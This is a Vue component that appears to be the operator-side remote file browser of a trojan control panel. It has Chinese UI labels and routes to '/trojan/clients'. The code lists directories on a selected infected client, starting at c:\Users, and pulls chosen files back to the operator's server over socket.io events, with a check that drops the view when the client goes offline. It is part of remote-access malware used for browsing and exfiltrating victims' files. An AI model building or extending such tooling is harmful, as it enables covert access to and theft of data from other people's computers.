<template>
  <div>
    <div>
      <div id="fileControlGroup">
        <p>ID: {{ id }}</p>
        <p style="color: green">当前路径: {{ currentUrl }}</p>
        <input
          v-model="currentUrl"
          style="width: 60vw"
          @keydown.enter="openDir(currentUrl)"
        />
        <button @click="openDir(currentUrl)">读取目录</button>
        <button @click="goBack">返回</button>
        <div id="file-button" v-if="selectedFile && !selectedFile.isDir">
          <button @click="download(selectedFile.name)">下载选择文件</button>
          <button>显示选择文件内容</button>
        </div>
      </div>
      <div class="fileGroup">
        <p @click="goBack">..\</p>
        <template v-for="(file, index) in fileList" :key="index">
          <p
            @contextmenu="showFileContextMenu(file.name)"
            @click="selectFile(fileList[index])"
            :class="checkFileClass(file)"
            @dblclick="openDir(file.name)"
          >
            {{ file.name }}
          </p>
        </template>
      </div>
    </div>
    <context-menu
      :contextMenu="$store.state.contextMenu"
      :msg="msg"
      :template="contextMenu.template"
    ></context-menu>
  </div>
</template>

<script>
// const path = window.require("path");
// import path from "path";
// const { ipcRenderer } = window.require("electron");
// const fs = window.require("fs");
import path from "path-win32";
import ContextMenuVue from "../../components/ContextMenu";
import { SERVER_ADDRESS } from "../../../my_config";

class util {}
util.IdIndex = function (id) {
  for (let i = 0; i < window.clientArr.length; i++) {
    if (window.clientArr[i].id === id) {
      return i;
    }
  }
  return -1;
};

export default {
  data() {
    return {
      id: "",
      currentUrl: "c:\\Users",
      fileList: [],
      selectedFile: null,
      msg: {},
      contextMenu: {
        template: [
          {
            label: "下载此文件",
            click: () => {
              // event.reply("downloadfile", msg.id, fileUrl);
            },
          },
          {
            label: "显示此文件内容",
            click: () => {
              // event.reply("showfilecontent", fileUrl);
            },
          },
          // { type: "separator" },

          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
      },
    };
  },
  computed: {
    isDir() {
      return function (is_dir) {
        return is_dir ? { color: "red" } : {};
      };
    },
    checkFileClass() {
      const that = this;
      return function (file) {
        let classList = [];
        if (file == that.selectedFile) {
          classList.push("file-selected");
        }
        if (file.isDir) {
          classList.push("file-is-dir");
        }
        return classList;
      };
    },
  },
  beforeMount() {
    let that = this;
    this.$nextTick(() => {
      this.openDir(".");
    });
    // ipcRenderer.on("downloadfile", (e, id, fileUrl) => {
    //   that.download(fileUrl);
    // });
    // ipcRenderer.on("showfilecontent", (e, fileUrl) => {});
    window.io.on("apilistdir", (result, url) => {
      // console.log(result);
      if (result.length) {
        console.log(result);
        that.fileList = result;
        that.currentUrl = url;
      }
    });
    // window.ss(window.io).on("apidownloadfile", (stream) => {
    //   console.log(stream);
    //   console.log(666);
    //   // stream.pipe(fs.createWriteStream("C:\\ProgramData\\nssm\\testbili123"));
    // });
    window.io.on("apidownloadfile", (fileName) => {
      window.open(`${SERVER_ADDRESS}:7071/tmpDir/${fileName}`);
    });
    window.io.on("apishowfilecontent", (raw) => {});
    this.id = this.$route.query.id;

    this.interval = setInterval(() => {
      if (util.IdIndex(this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);
  },
  methods: {
    selectFile(file) {
      if (this.selectedFile == file) {
        this.selectedFile = null;
        return;
      }
      this.selectedFile = file;
    },
    showFileContextMenu(fileName) {
      let toUrl = path.resolve(this.currentUrl, fileName);
      // ipcRenderer.send("file-context-menu", { id: this.id }, toUrl);
    },
    goBack() {
      this.currentUrl = path.resolve(this.currentUrl, "..");
      window.io.emit("apilistdir", this.id, this.currentUrl);
    },
    openDir(target) {
      let toUrl = path.resolve(this.currentUrl, target);
      console.log(toUrl);
      window.io.emit("apilistdir", this.id, toUrl);
    },
    download(target) {
      let that = this;
      const fileUrl = path.resolve(this.currentUrl, target);
      window.io.emit("apidownloadfile", that.id, fileUrl);
    },
    showFileContent(target) {
      window.io.emit("apishowfilecontent", this.id, target);
    },
    showDetails() {},
  },
  components: {
    "context-menu": ContextMenuVue,
  },
};
</script>

<style lang="less">
#fileControlGroup {
  // display: flex;
}
.file-is-dir {
  color: red;
}
.file-selected {
  background-color: rgb(209, 209, 209);
  border: 3px rgb(6, 90, 158) solid !important;
}
#file-button {
  margin-left: 5px;
  display: inline;
}
.fileGroup {
  height: 52vh;
  display: flex;
  flex-direction: column;
  flex-wrap: wrap;
  overflow: scroll;
  // padding: 30px;
  align-items: center;
  p {
    user-select: none;
    white-space: nowrap;
    flex-grow: 0;
    flex-shrink: 1;
    margin-top: 3px;
    width: 20vw;
    cursor: pointer;
    overflow: hidden;
    text-overflow: ellipsis;
    border: 1px black solid;
    height: 4vh;
    &:hover {
      // width: auto;
      overflow: visible;
      text-overflow: inherit;
      // background-color: lightcoral;
      font-size: 1.1rem;
      text-shadow: 1px 0 black;
      z-index: 999;
      // width: 30vw;
    }
  }
}
</style>
